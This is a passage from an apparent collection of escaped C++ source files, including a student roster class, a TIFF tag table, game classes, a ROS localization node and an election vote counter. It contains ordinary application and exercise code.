degreeprogram);\n\ti++;\n}\nStudent* Roster::getClassRosterArray(int j) {\n\treturn classRosterArray[j]; //return indexed student object\n}\nvoid Roster::printAll() {\n\tcout << \"Displaying all Students: \" << endl << endl;\n\tfor (int i = 0; i < 5; i++) {\n\t\tif (classRosterArray[i] != NULL) {\n\t\t\tclassRosterArray[i]->print();\n\t\t}\n\t\t\n\t\t\n\t}\n\tcout << endl;\n}\nvoid Roster::printInvalidEmails() {\n\tcout << \"Displaying invalid emails:\" << endl << endl;\n\tfor (int i = 0; i < 5; i++) {\n\t\tstring currentEmail = classRosterArray[i]->getEmailAddress();\n\t\tif (currentEmail.find(\"@\") != string::npos && currentEmail.find(\".\") != string::npos && currentEmail.find(\" \") == string::npos) {\n\t\t\t\n\t\t}\n\t\telse {\n\t\t\tcout << currentEmail << \" -  is invalid.\" << endl;\n\t\t}\n\t}\n\tcout << endl;\n}\nvoid Roster::printAverageDaysInCourse(string studentID) {\n\tfor (int i = 0; i < 5; i++) {\n\t\t//string currStudID = classRosterArray[i]->getStudentID();\n\t\t//int currStudAvgDays = classRosterArray[i]->getDaysInCourse();\n\t\tif (classRosterArray[i]->getStudentID() == studentID) {\n\t\t\t\n\t\t\tint avgDays = (classRosterArray[i]->getDaysInCourse()[0] + classRosterArray[i]->getDaysInCourse()[1] + classRosterArray[i]->getDaysInCourse()[2]) / 3;\n\t\t\tcout << \"Student ID: \" << studentID << \", average days in course is: \" << avgDays << endl;\n\t\t}\n\t} \n\tcout << endl;\n}\nvoid Roster::printByDegreeProgram(DegreeProgram degreeProgram) {\n\tcout << \"Showing students in degree program: SOFTWARE\" << endl << endl;\n\tfor (int i = 0; i < 5; i++) {\n\t\tif (classRosterArray[i]->getDegreeProgram() == degreeProgram) {\n\t\t\tclassRosterArray[i]->print();\n\t\t}\n\t}\n\tcout << endl;\n}\nvoid Roster::remove(string studentID) {\n\tcout << \"Removing \" << studentID << \":\" << endl << endl;\n\tbool sID = false;\n\tint i = 0;\n\twhile ((sID == false) && (i < 5)) {\n\t\t//if (classRosterArray[i]->getStudentID() == \"\") {\n\t\t//}\n\t\tif (classRosterArray[i] != NULL && classRosterArray[i]->getStudentID() == studentID) {\n\t\t\tsID = true;\n\t\t\tdelete classRosterArray[i];\n\t\t\tfor (int j = i; j < 4; j++) {\n\t\t\t\tclassRosterArray[j] = classRosterArray[j + 1];\n\t\t\t}\n\t\t\tclassRosterArray[4] = NULL;\n\t\t\tcout << \"Student identified as A3 has been removed\" << endl;\n\t\t}\n\t\ti++;\t\n\t}\n\tif (sID == false) {\n\t\tcout << \"The student with the ID: A3 was not found.\" << endl;\n\t}\n\tcout << endl;\n}\nRoster::~Roster() {\n\n\tfor (int i = 0; i < 5; i++) {\n\t\tdelete classRosterArray[i];\n\t}\n\tcout << \"Destructor called\";\n}",
    "\ufeff#include \"tiffhdr.hpp\"\n\n#include <sstream>\n#include <algorithm>\n#include <cstring>\n#include <cinttypes>\n\n// #define DEBUG_TIFFHeader 1\n\nnamespace UniformBitmap\n{\n\tconstexpr std::pair<const char*, uint16_t> IFDTagData[] =\n\t{\n\t\t{\"InteropIndex\", 0x0001},\n\t\t{\"InteropVersion\", 0x0002},\n\t\t{\"ProcessingSoftware\", 0x000b},\n\t\t{\"SubfileType\", 0x00fe},\n\t\t{\"OldSubfileType\", 0x00ff},\n\t\t{\"ImageWidth\", 0x0100},\n\t\t{\"ImageHeight\", 0x0101},\n\t\t{\"BitsPerSample\", 0x0102},\n\t\t{\"Compression\", 0x0103},\n\t\t{\"PhotometricInterpretation\", 0x0106},\n\t\t{\"Thresholding\", 0x0107},\n\t\t{\"CellWidth\", 0x0108},\n\t\t{\"CellLength\", 0x0109},\n\t\t{\"FillOrder\", 0x010a},\n\t\t{\"DocumentName\", 0x010d},\n\t\t{\"ImageDescription\", 0x010e},\n\t\t{\"Make\", 0x010f},\n\t\t{\"Model\", 0x0110},\n\t\t{\"JpgFromRawStart\", 0x0111},\n\t\t{\"OtherImageStart\", 0x0111},\n\t\t{\"StripOffsets\", 0x0111},\n\t\t{\"PreviewImageStart\", 0x0111},\n\t\t{\"StripOffsets\", 0x0111},\n\t\t{\"Orientation\", 0x0112},\n\t\t{\"SamplesPerPixel\", 0x0115},\n\t\t{\"RowsPerStrip\", 0x0116},\n\t\t{\"JpgFromRawLength\", 0x0117},\n\t\t{\"PreviewImageLength\", 0x0117},\n\t\t{\"StripByteCounts\", 0x0117},\n\t\t{\"OtherImageLength\", 0x0117},\n\t\t{\"MinSampleValue\", 0x0118},\n\t\t{\"MaxSampleValue\", 0x0119},\n\t\t{\"XResolution\", 0x011a},\n\t\t{\"YResolution\", 0x011b},\n\t\t{\"PlanarConfiguration\", 0x011c},\n\t\t{\"PageName\", 0x011d},\n\t\t{\"XPosition\", 0x011e},\n\t\t{\"YPosition\", 0x011f},\n\t\t{\"FreeOffsets\", 0x0120},\n\t\t{\"FreeByteCounts\", 0x0121},\n\t\t{\"GrayResponseUnit\", 0x0122},\n\t\t{\"GrayResponseCurve\", 0x0123},\n\t\t{\"T4Options\", 0x0124},\n\t\t{\"T6Options\", 0x0125},\n\t\t{\"ResolutionUnit\", 0x0128},\n\t\t{\"PageNumber\", 0x0129},\n\t\t{\"ColorResponseUnit\", 0x012c},\n\t\t{\"TransferFunction\", 0x012d},\n\t\t{\"Software\", 0x0131},\n\t\t{\"ModifyDate\", 0x0132},\n\t\t{\"Artist\", 0x013b},\n\t\t{\"HostComputer\", 0x013c},\n\t\t{\"Predictor\", 0x013d},\n\t\t{\"WhitePoint\", 0x013e},\n\t\t{\"PrimaryChromaticities\", 0x013f},\n\t\t{\"ColorMap\", 0x0140},\n\t\t{\"HalftoneHints\", 0x0141},\n\t\t{\"TileWidth\", 0x0142},\n\t\t{\"TileLength\", 0x0143},\n\t\t{\"TileOffsets\", 0x0144},\n\t\t{\"TileByteCounts\", 0x0145},\n\t\t{\"BadFaxLines\", 0x0146},\n\t\t{\"CleanFaxData\", 0x0147},\n\t\t{\"ConsecutiveBadFaxLines\", 0x0148},\n\t\t{\"SubIFD\", 0x014a},\n\t\t{\"A100DataOffset\", 0x014a},\n\t\t{\"InkSet\", 0x014c},\n\t\t{\"InkNames\", 0x014d},\n\t\t{\"NumberofInks\", 0x014e},\n\t\t{\"DotRange\", 0x0150},\n\t\t{\"TargetPrinter\", 0x0151},\n\t\t{\"ExtraSamples\", 0x0152},\n\t\t{\"SampleFormat\", 0x0153},\n\t\t{\"SMinSampleValue\", 0x0154},\n\t\t{\"SMaxSampleValue\", 0x0155},\n\t\t{\"TransferRange\", 0x0156},\n\t\t{\"ClipPath\", 0x0157},\n\t\t{\"XClipPathUnits\", 0x0158},\n\t\t{\"YClipPathUnits\", 0x0159},\n\t\t{\"Indexed\", 0x015a},\n\t\t{\"JPEGTables\", 0x015b},\n\t\t{\"OPIProxy\", 0x015f},\n\t\t{\"GlobalParametersIFD\", 0x0190},\n\t\t{\"ProfileType\", 0x0191},\n\t\t{\"FaxProfile\", 0x0192},\n\t\t{\"CodingMethods\", 0x0193},\n\t\t{\"VersionYear\", 0x0194},\n\t\t{\"ModeNumber\", 0x0195},\n\t\t{\"Decode\", 0x01b1},\n\t\t{\"DefaultImageColor\", 0x01b2},\n\t\t{\"T82Options\", 0x01b3},\n\t\t{\"JPEGTables\", 0x01b5},\n\t\t{\"JPEGProc\", 0x0200},\n\t\t{\"JpgFromRawStart\", 0x0201},\n\t\t{\"OtherImageStart\", 0x0201},\n\t\t{\"PreviewImageStart\", 0x0201},\n\t\t{\"ThumbnailOffset\", 0x0201},\n\t\t{\"ThumbnailLength\", 0x0202},\n\t\t{\"JpgFromRawLength\", 0x0202},\n\t\t{\"PreviewImageLength\", 0x0202},\n\t\t{\"ThumbnailLength\", 0x0202},\n\t\t{\"OtherImageLength\", 0x0202},\n\t\t{\"JPEGRestartInterval\", 0x0203},\n\t\t{\"JPEGLosslessPredictors\", 0x0205},\n\t\t{\"JPEGPointTransforms\", 0x0206},\n\t\t{\"JPEGQTables\", 0x0207},\n\t\t{\"JPEGDCTables\", 0x0208},\n\t\t{\"JPEGACTables\", 0x0209},\n\t\t{\"YCbCrCoefficients\", 0x0211},\n\t\t{\"YCbCrSubSampling\", 0x0212},\n\t\t{\"YCbCrPositioning\", 0x0213},\n\t\t{\"ReferenceBlackWhite\", 0x0214},\n\t\t{\"StripRowCounts\", 0x022f},\n\t\t{\"ApplicationNotes\", 0x02bc},\n\t\t{\"USPTOMiscellaneous\", 0x03e7},\n\t\t{\"RelatedImageFileFormat\", 0x1000},\n\t\t{\"RelatedImageWidth\", 0x1001},\n\t\t{\"RelatedImageHeight\", 0x1002},\n\t\t{\"Rating\", 0x4746},\n\t\t{\"XP_DIP_XML\", 0x4747},\n\t\t{\"StitchInfo\", 0x4748},\n\t\t{\"RatingPercent\", 0x4749},\n\t\t{\"SonyRawFileType\", 0x7000},\n\t\t{\"SonyToneCurve\", 0x7010},\n\t\t{\"VignettingCorrection\", 0x7031},\n\t\t{\"VignettingCorrParams\", 0x7032},\n\t\t{\"ChromaticAberrationCorrection\", 0x7034},\n\t\t{\"ChromaticAberrationCorrParams\", 0x7035},\n\t\t{\"DistortionCorrection\", 0x7036},\n\t\t{\"DistortionCorrParams\", 0x7037},\n\t\t{\"SonyRawImageSize\", 0x7038},\n\t\t{\"BlackLevel\", 0x7310},\n\t\t{\"WB_RGGBLevels\", 0x7313},\n\t\t{\"SonyCropTopLeft\", 0x74c7},\n\t\t{\"SonyCropSize\", 0x74c8},\n\t\t{\"ImageID\", 0x800d},\n\t\t{\"WangTag1\", 0x80a3},\n\t\t{\"WangAnnotation\", 0x80a4},\n\t\t{\"WangTag3\", 0x80a5},\n\t\t{\"WangTag4\", 0x80a6},\n\t\t{\"ImageReferencePoints\", 0x80b9},\n\t\t{\"RegionXformTackPoint\", 0x80ba},\n\t\t{\"WarpQuadrilateral\", 0x80bb},\n\t\t{\"AffineTransformMat\", 0x80bc},\n\t\t{\"Matteing\", 0x80e3},\n\t\t{\"DataType\", 0x80e4},\n\t\t{\"ImageDepth\", 0x80e5},\n\t\t{\"TileDepth\", 0x80e6},\n\t\t{\"ImageFullWidth\", 0x8214},\n\t\t{\"ImageFullHeight\", 0x8215},\n\t\t{\"TextureFormat\", 0x8216},\n\t\t{\"WrapModes\", 0x8217},\n\t\t{\"FovCot\", 0x8218},\n\t\t{\"MatrixWorldToScreen\", 0x8219},\n\t\t{\"MatrixWorldToCamera\", 0x821a},\n\t\t{\"Model2\", 0x827d},\n\t\t{\"CFARepeatPatternDim\", 0x828d},\n\t\t{\"CFAPattern2\", 0x828e},\n\t\t{\"BatteryLevel\", 0x828f},\n\t\t{\"KodakIFD\", 0x8290},\n\t\t{\"Copyright\", 0x8298},\n\t\t{\"ExposureTime\", 0x829a},\n\t\t{\"FNumber\", 0x829d},\n\t\t{\"MDFileTag\", 0x82a5},\n\t\t{",
    "//\n// Created by yb on 2024/5/13.\n//\n\n#include \"Chomper.h\"\nplant::plantType Chomper::s_type=plantType::Chomper;\nChomper::Chomper() {\n    this->m_temp= nullptr;\n    this->m_dy-=25;\n    this->m_damage=500;\n    this->setStatus(ChomperStatus::Normal);\n    this->m_action->setLoop(true);\n    this->m_action->setInterval(75);\n\n    this->m_timer.setWaitTime(15000);\n    this->m_timer.setOneTrigger(true);\n    this->m_timer.setCallback([this](){\n        setStatus(ChomperStatus::Normal);\n    });\n}\n\nplant::plantType Chomper::getType() {\n    return s_type;\n}\n\nvoid Chomper::setStatus(Chomper::ChomperStatus status) {\n    m_status = status;\n    Atlas ::SP atlas;\n    switch (status) {\n        case ChomperStatus::Normal:\n            atlas=std::make_shared<Atlas>(Singleton<res>::instanceSP()->atls_plants[int(s_type)]);\n            break;\n        case ChomperStatus::Attack:\n            atlas=std::make_shared<Atlas>(Singleton<res>::instanceSP()->atl_ChomperAttack);\n            m_action->setLoop(false);\n            m_action->setCallback([this](){\n                if(m_damage>=m_temp->m_blood){\n                    setStatus(ChomperStatus::Digestion);\n                    m_temp->m_used=false;\n                }\n                else{\n                    m_action->reset();\n                    m_temp->m_blood-=m_damage;\n                    m_temp->setEffect(0);\n                }\n            });\n            break;\n        case ChomperStatus::Digestion:\n            atlas=std::make_shared<Atlas>(Singleton<res>::instanceSP()->atl_ChomperDigestion);\n            m_action->setLoop(true);\n            this->m_timer.restart();\n            break;\n    }\n    this->m_action->setAtlas(atlas);\n}\n\nvoid Chomper::collide(Object *obj) {\n    if(!obj->m_isCollide){return;}\n    if(yb::checkHitX(obj->m_x,m_x-50,150)&&m_status==ChomperStatus::Normal){\n        setStatus(ChomperStatus::Attack);\n        m_temp=obj;\n    }\n}\n\nvoid Chomper::skills(int delta) {\n    if(m_status==ChomperStatus::Digestion){\n        m_timer.update(delta);\n    }\n}\n",
    "/**\n * @file emcl.cpp\n * @author Toshiki Nakamura\n * @brief C++ implementation of emcl(mcl with expansion resetting)\n * @copyright Copyright (c) 2024\n */\n\n#include <algorithm>\n#include <vector>\n\n#include \"emcl/emcl.h\"\n\nEMCL::EMCL(void) : private_nh_(\"~\")\n{\n  load_params();\n\n  emcl_pose_pub_ = nh_.advertise<geometry_msgs::PoseWithCovarianceStamped>(\"/emcl_pose\", 1);\n  particle_cloud_pub_ = nh_.advertise<geometry_msgs::PoseArray>(\"particle_cloud\", 1);\n  cloud_sub_ = nh_.subscribe(\"/cloud\", 1, &EMCL::cloud_callback, this, ros::TransportHints().reliable().tcpNoDelay());\n  initial_pose_sub_ = nh_.subscribe(\n      \"/initialpose\", 1, &EMCL::initial_pose_callback, this, ros::TransportHints().reliable().tcpNoDelay());\n  laser_scan_sub_ =\n      nh_.subscribe(\"/scan\", 1, &EMCL::laser_scan_callback, this, ros::TransportHints().reliable().tcpNoDelay());\n  odom_sub_ = nh_.subscribe(\"/odom\", 1, &EMCL::odom_callback, this, ros::TransportHints().reliable().tcpNoDelay());\n  dyn_reconf_server_.setCallback(boost::bind(&EMCL::dyn_reconf_callback, this, _1, _2));\n\n  ROS_INFO_STREAM(ros::this_node::getName() << \" node has started..\");\n  print_params();\n\n  particles_.reserve(emcl_param_.particle_num);\n  odom_model_ = OdomModel(odom_model_param_.ff, odom_model_param_.fr, odom_model_param_.rf, odom_model_param_.rr);\n  initialize(emcl_param_.init_x, emcl_param_.init_y, emcl_param_.init_yaw);\n  get_map();\n}\n\nvoid EMCL::cloud_callback(const sensor_msgs::PointCloud2::ConstPtr &msg)\n{\n  if (!prev_odom_.has_value() || !emcl_param_.use_cloud)\n    return;\n\n  // Update the observation model\n  const float average_likelihood = calc_average_likelihood(*msg);\n\n  // Estimate the pose by the weighted mean\n  estimate_pose();\n  broadcast_map_to_odom_tf();\n  publish_estimated_pose();\n  publish_particles();\n\n  // reset or resampling\n  ROS_INFO_STREAM_THROTTLE(1.0, \"average_likelihood = \" << std::fixed << std::setprecision(4) << average_likelihood);\n  if (average_likelihood < emcl_param_.likelihood_th && emcl_param_.reset_counter < emcl_param_.reset_count_limit)\n  {\n    ROS_WARN_STREAM_THROTTLE(1.0, \"Reset (likelihood < \" << emcl_param_.likelihood_th << \")\");\n    expansion_reset();\n    emcl_param_.reset_counter++;\n  }\n  else\n  {\n    resampling();\n    emcl_param_.reset_counter = 0;\n  }\n}\n\nvoid EMCL::initial_pose_callback(const geometry_msgs::PoseWithCovarianceStamped::ConstPtr &msg)\n{\n  initialize(msg->pose.pose.position.x, msg->pose.pose.position.y, tf2::getYaw(msg->pose.pose.orientation));\n}\n\nvoid EMCL::laser_scan_callback(const sensor_msgs::LaserScan::ConstPtr &msg)\n{\n  if (!prev_odom_.has_value() || emcl_param_.use_cloud)\n    return;\n\n  // Update the observation model\n  const float average_likelihood = calc_average_likelihood(*msg);\n\n  // Estimate the pose by the weighted mean\n  estimate_pose();\n  broadcast_map_to_odom_tf();\n  publish_estimated_pose();\n  publish_particles();\n\n  // reset or resampling\n  ROS_INFO_STREAM_THROTTLE(1.0, \"average_likelihood = \" << std::fixed << std::setprecision(4) << average_likelihood);\n  if (average_likelihood < emcl_param_.likelihood_th && emcl_param_.reset_counter < emcl_param_.reset_count_limit)\n  {\n    ROS_WARN_STREAM_THROTTLE(1.0, \"Reset (likelihood < \" << emcl_param_.likelihood_th << \")\");\n    expansion_reset();\n    emcl_param_.reset_counter++;\n  }\n  else\n  {\n    resampling();\n    emcl_param_.reset_counter = 0;\n  }\n}\n\nvoid EMCL::odom_callback(const nav_msgs::Odometry::ConstPtr &msg)\n{\n  if (last_odom_.has_value())\n    prev_odom_ = last_odom_;\n  last_odom_ = Pose(msg->pose.pose.position.x, msg->pose.pose.position.y, tf2::getYaw(msg->pose.pose.orientation));\n  odom_frame_id_ = msg->header.frame_id;\n  if (prev_odom_.has_value())\n    motion_update();  // Update the particles\n}\n\nvoid EMCL::initialize(const float init_x, const float init_y, const float init_yaw)\n{\n  emcl_pose_.set(init_x, init_y, init_yaw);\n  particles_.clear();\n  for (int i = 0; i < emcl_param_.particle_num; i++)\n    particles_.push_back(Particle(\n        norm_dist(init_x, emcl_param_.init_position_dev), norm_dist(init_y, emcl_param_.init_position_dev),\n        norm_dist(init_yaw, emcl_param_.init_orientation_dev)));\n  reset_weight();\n  ROS_WARN(\"Initialized\");\n}\n\nfloat EMCL::norm_dist(const float mean, const float stddev)\n{\n  std::normal_distribution<> norm_dist(mean, stddev);\n  return norm_dist(gen_);\n}\n\nvoid EMCL::reset_weight(void)\n{\n  for (auto &p : particles_)\n    p.set_weight(1.0 / particles_.size());\n}\n\nvoid EMCL::get_map(void)\n{\n  nav_msgs::GetMap::Request req;\n  nav_msgs::GetMap::Response resp;\n  while (ros::ok())\n  {\n    if (ros::service::call(\"/static_map\", req, resp))\n      break;\n    ROS_WARN_THROTTLE(2.0, \"Waiting for a map\");\n    ros::Duration(0.5).sleep();\n  }\n  map_ = resp.map;\n  ROS_WARN(\"Received a map\");\n}\n\nvoid EMCL::motion_update(void)\n{\n  Pose delta_pose = last_odom_.value() - prev_odom_.value();\n  if (delta_pose.nearly_zero())\n    return;\n\n  const float length = hypot(delta_pose.x(), delta_pose.y());\n  const float direction = ",
    "#include \"ofxOfeliaCreator.h\"\n#include \"ofxOfeliaDefine.h\"\n#include \"ofxOfeliaGet.h\"\n#include \"ofxOfeliaSet.h\"\n#include \"ofxOfeliaExists.h\"\n#include <cstring>\n\nvoid *ofxOfeliaCreator::newWrapper(t_symbol *s, int argc, t_atom *argv)\n{\n    if (!argc || argv[0].a_type != A_SYMBOL)\n        pd_this->pd_newest = static_cast<t_pd *>(ofxOfeliaDefine::newWrapper(s, argc, argv));\n    else\n    {\n        const char *str = argv[0].a_w.w_symbol->s_name;\n        if (!std::strcmp(str, \"d\") || !std::strcmp(str, \"define\"))\n            pd_this->pd_newest = static_cast<t_pd *>(ofxOfeliaDefine::newWrapper(gensym(\"define\"), argc - 1, argv + 1));\n        else if (!std::strcmp(str, \"f\") || !std::strcmp(str, \"function\"))\n            pd_this->pd_newest = static_cast<t_pd *>(ofxOfeliaFunction::newWrapper(gensym(\"function\"), argc - 1, argv + 1));\n        else if (!std::strcmp(str, \"get\"))\n            pd_this->pd_newest = static_cast<t_pd *>(ofxOfeliaGet::newWrapper(gensym(\"get\"), argc - 1, argv + 1));\n        else if (!std::strcmp(str, \"set\"))\n            pd_this->pd_newest = static_cast<t_pd *>(ofxOfeliaSet::newWrapper(gensym(\"set\"), argc - 1, argv + 1));\n        else if (!std::strcmp(str, \"e\") || !std::strcmp(str, \"exists\"))\n            pd_this->pd_newest = static_cast<t_pd *>(ofxOfeliaExists::newWrapper(gensym(\"exists\"), argc - 1, argv + 1));\n        else\n        {\n            pd_error(0, \"list %s: unknown function\", str);\n            pd_this->pd_newest = 0;\n        }\n    }\n    return pd_this->pd_newest;\n}\n\nvoid ofxOfeliaCreator::setup()\n{\n    class_addcreator(reinterpret_cast<t_newmethod>(newWrapper), gensym(\"ofelia\"), A_GIMME, 0);\n}\n",
    "#include <bits/stdc++.h>\r\nusing namespace std;\r\nclass Node\r\n{\r\npublic:\r\n    int data;\r\n    Node *left;\r\n    Node *right;\r\n    // create the construte\r\n    Node(int data)\r\n    {\r\n        this->data = data;\r\n        left = NULL;\r\n        right = NULL;\r\n    }\r\n};\r\n// create the function\r\nNode *buildTree(int data)\r\n{\r\n    // 1-data indicates that we have arrived at the leaf node & hence return NULL.\r\n    // depands on the question\r\n    if (data == -1)\r\n    {\r\n        return NULL;\r\n    }\r\n    // create root node(solve one case )\r\n    Node *root = new Node(data);\r\n\r\n    // recussion handle for left & right subtree\r\n    int leftData;\r\n\r\n    cout << \"Enter data of left of\" << data << endl;\r\n    cin >> leftData;\r\n    root->left = buildTree(leftData);\r\n\r\n    int rightData;\r\n    cout << \"Enter data right of \" << data << endl;\r\n    cin >> rightData;\r\n    root->right = buildTree(rightData);\r\n\r\n    return root;\r\n}\r\n//print the post oder tree of binary tree using reursion  method\r\nvoid postOrderTraversal(Node *root)\r\n{\r\n    // base case\r\n    if (root == NULL)\r\n    {\r\n        return;\r\n    }\r\n    // left child\r\n    postOrderTraversal(root->left);\r\n\r\n    // right child\r\n    postOrderTraversal(root->right);\r\n\r\n    // Node\r\n    cout << root->data << \" \";\r\n}\r\nint main()\r\n{\r\n    Node *root;\r\n    int data;\r\n\r\n    cout << \"Enter data for root node\" << endl;\r\n    cin >> data;\r\n    root = buildTree(data);\r\n\r\n    cout << \"postOrder Traversal\" << endl;\r\n    postOrderTraversal(root);\r\n\r\n    return 0;\r\n}",
    "// Copyright Epic Games, Inc. All Rights Reserved.\n\n#include \"RapidCharacter.h\"\n\n#include \"AbilitySystemComponent.h\"\n#include \"Engine/LocalPlayer.h\"\n#include \"Camera/CameraComponent.h\"\n#include \"Components/CapsuleComponent.h\"\n#include \"GameFramework/CharacterMovementComponent.h\"\n#include \"GameFramework/SpringArmComponent.h\"\n#include \"GameFramework/Controller.h\"\n#include \"EnhancedInputComponent.h\"\n#include \"EnhancedInputSubsystems.h\"\n#include \"InputActionValue.h\"\n#include \"AbilitySystem/Input/GameplayAbilityInputConfig.h\"\n\nDEFINE_LOG_CATEGORY(LogTemplateCharacter);\n\n//////////////////////////////////////////////////////////////////////////\n// ARapidCharacter\n\nARapidCharacter::ARapidCharacter()\n{\n\tGetCapsuleComponent()->InitCapsuleSize(42.f, 96.0f);\n\n\tbUseControllerRotationPitch = false;\n\tbUseControllerRotationYaw = false;\n\tbUseControllerRotationRoll = false;\n\n\tGetCharacterMovement()->bOrientRotationToMovement = true;\n\tGetCharacterMovement()->RotationRate = FRotator(0.0f, 500.0f, 0.0f);\n\n\tGetCharacterMovement()->JumpZVelocity = 700.f;\n\tGetCharacterMovement()->AirControl = 0.35f;\n\tGetCharacterMovement()->MaxWalkSpeed = 500.f;\n\tGetCharacterMovement()->MinAnalogWalkSpeed = 20.f;\n\tGetCharacterMovement()->BrakingDecelerationWalking = 2000.f;\n\tGetCharacterMovement()->BrakingDecelerationFalling = 1500.0f;\n\n\tCameraBoom = CreateDefaultSubobject<USpringArmComponent>(TEXT(\"CameraBoom\"));\n\tCameraBoom->SetupAttachment(RootComponent);\n\tCameraBoom->TargetArmLength = 400.0f;\n\tCameraBoom->bUsePawnControlRotation = true;\n\n\tFollowCamera = CreateDefaultSubobject<UCameraComponent>(TEXT(\"FollowCamera\"));\n\tFollowCamera->SetupAttachment(CameraBoom, USpringArmComponent::SocketName);\n\tFollowCamera->bUsePawnControlRotation = false;\n}\n\nvoid ARapidCharacter::PostInitializeComponents()\n{\n\tSuper::PostInitializeComponents();\n\n\tInitializeGameplayAbilitySystem();\n}\n\nvoid ARapidCharacter::BeginPlay()\n{\n\tSuper::BeginPlay();\n\n\tif (const APlayerController* PlayerController = Cast<APlayerController>(Controller))\n\t{\n\t\tif (UEnhancedInputLocalPlayerSubsystem* Subsystem = ULocalPlayer::GetSubsystem<\n\t\t\tUEnhancedInputLocalPlayerSubsystem>(PlayerController->GetLocalPlayer()))\n\t\t{\n\t\t\tSubsystem->AddMappingContext(DefaultMappingContext, 0);\n\t\t}\n\t}\n}\n\n\nvoid ARapidCharacter::SetupPlayerInputComponent(UInputComponent* PlayerInputComponent)\n{\n\tif (UEnhancedInputComponent* EnhancedInputComponent = Cast<UEnhancedInputComponent>(PlayerInputComponent))\n\t{\n\t\tEnhancedInputComponent->BindAction(MoveAction, ETriggerEvent::Triggered, this, &ThisClass::Move);\n\n\t\tEnhancedInputComponent->BindAction(LookAction, ETriggerEvent::Triggered, this, &ThisClass::Look);\n\n\t\tif (GameplayAbilityInputConfig)\n\t\t{\n\t\t\tfor (const FGameplayInputAbilityInfo& InputAbility : GameplayAbilityInputConfig->GetInputAbilities())\n\t\t\t{\n\t\t\t\tif (InputAbility.IsValid())\n\t\t\t\t{\n\t\t\t\t\tconst UInputAction* InputAction = InputAbility.InputAction.LoadSynchronous();\n\t\t\t\t\tconst int32 InputID = InputAbility.InputID;\n\n\t\t\t\t\tEnhancedInputComponent->BindAction(InputAction, ETriggerEvent::Triggered, this,\n\t\t\t\t\t                                   &ThisClass::OnAbilityInputPressed, InputID);\n\t\t\t\t\tEnhancedInputComponent->BindAction(InputAction, ETriggerEvent::Completed, this,\n\t\t\t\t\t                                   &ThisClass::OnAbilityInputReleased, InputID);\n\t\t\t\t}\n\t\t\t}\n\t\t}\n\t}\n\telse\n\t{\n\t\tUE_LOG(LogTemplateCharacter, Error,\n\t\t       TEXT(\n\t\t\t       \"'%s' Failed to find an Enhanced Input component! This template is built to use the Enhanced Input system. If you intend to use the legacy system, then you will need to update this C++ file.\"\n\t\t       ), *GetNameSafe(this));\n\t}\n}\n\nvoid ARapidCharacter::InitializeGameplayAbilitySystem() const\n{\n\tif (!GameplayAbilityInputConfig)\n\t\treturn;\n\n\tfor (const FGameplayInputAbilityInfo& InputAbility : GameplayAbilityInputConfig->GetInputAbilities())\n\t{\n\t\tif (InputAbility.IsValid())\n\t\t{\n\t\t\tconst FGameplayAbilitySpec AbilitySpec = FGameplayAbilitySpec(\n\t\t\t\tInputAbility.GameplayAbilityClass.LoadSynchronous(), 1 /* default ability level */,\n\t\t\t\tInputAbility.InputID);\n\t\t\tAbilitySystemComponent->GiveAbility(AbilitySpec);\n\t\t}\n\t}\n}\n\nvoid ARapidCharacter::OnAbilityInputPressed(int32 InputID)\n{\n\tAbilitySystemComponent->AbilityLocalInputPressed(InputID);\n}\n\nvoid ARapidCharacter::OnAbilityInputReleased(int32 InputID)\n{\n\tAbilitySystemComponent->AbilityLocalInputReleased(InputID);\n}\n\nvoid ARapidCharacter::Move(const FInputActionValue& Value)\n{\n\tconst FVector2D MovementVector = Value.Get<FVector2D>();\n\n\tif (Controller)\n\t{\n\t\tconst FRotator Rotation = Controller->GetControlRotation();\n\t\tconst FRotator YawRotation(0, Rotation.Yaw, 0);\n\n\t\tconst FVector ForwardDirection = FRotationMatrix(YawRotation).GetUnitAxis(EAxis::X);\n\n\t\tconst FVector RightDirection = FRotationMatrix(YawRotation).GetUnitAxis(EAxis::Y);\n\n\t\tAddMovementInput(ForwardDirection, MovementVector.Y);\n\t\tAddMovementInput(RightDirection, MovementVector.X);\n\t}\n}\n\nvoid ARapidCharacter::Look(const FInputActionValue& Value)\n{\n\tconst FVector2D LookAxisVec",
    "#include \"MVSystem.h\"\n\n#include <bits/stdc++.h>\n\n#include <algorithm>\n#include <fstream>\n#include <iomanip>\n#include <iostream>\n#include <string>\n#include <sstream>\n\n#include \"Candidate.h\"\n#include \"Party.h\"\n#include \"TieBreaker.h\"\n\nMVSystem::~MVSystem() {}\n\n\nMVSystem::MVSystem(std::string filename) : ElectionSystem(), filename(filename) {}\n\n\nvoid MVSystem::setFilename(const std::string& newFilename) {\n    filename = newFilename;\n}\n\nbool sortByPartyMV(const std::pair<Party, int>& a, const std::pair<Party, int>& b) {\n  return a.second > b.second;              \n}\n\n\nbool sortByCandidateMV(const std::pair<Candidate, std::pair<Party, int>>& a,\n                     const std::pair<Candidate, std::pair<Party, int>>& b) {\n  return a.second.second > b.second.second;\n}\n\n\nstd::pair<bool, int> isThereATieMV(const std::vector<std::pair<Party, int>>& remainders, int seatsRemaining) {\n  if (remainders.empty() || seatsRemaining <= 0) {\n    return std::make_pair(false, 0);\n  }\n\n  int count = 0;\n  int highestRemainder = remainders.front().second;\n  std::cout << \"\\n\";\n\n  for (const auto& remainder : remainders) {\n    if (remainder.second == highestRemainder) {\n      count++;\n    }\n  }\n  // std::cout << count << \" parties have \" << highestRemainder << \" votes \";\n  return std::make_pair(count > seatsRemaining, count);\n}\n\n\nvoid MVSystem::processCandidates() {\n  std::string line;\n  std::ifstream file;\n  file.open(filename);\n\n  if (!file.is_open()) {\n    std::cout << \"\\nUnable to open file. (MV system)\" << std::endl;\n  }\n\n  std::string partyName;\n  std::string candidateName;\n\n\n  // skip 3 lines of the header to get to the candidates\n  std::getline(file, line);\n  std::getline(file, line);\n  std::getline(file, line);\n\n  //  now read the candidates\n  std::getline(file, line);\n  file.close();\n\n\n  // replace brackets, with spaces, then remove the spaces\n  std::replace(line.begin(), line.end(), '[', ' ');\n  std::replace(line.begin(), line.end(), ']', ' ');\n\n  line.erase(std::remove(line.begin(), line.end(), ' '), line.end());\n\n  std::istringstream iss(line);\n\n\n  while (std::getline(iss, candidateName, ',')) {\n    std::getline(iss, partyName, ',');\n\n    Candidate cand(candidateName);\n    Party party(partyName);\n\n    candidates.push_back(std::make_pair(cand, std::make_pair(party, 0)));\n  }\n}\n\n\nvoid MVSystem::countVotes() {\n  std::string line;\n  std::ifstream file;\n  file.open(filename);\n\n  if (!file.is_open()) {\n    std::cout << \"\\nUnable to open file. (MV system)\" << std::endl;\n  }\n\n  // read in file until we get to the 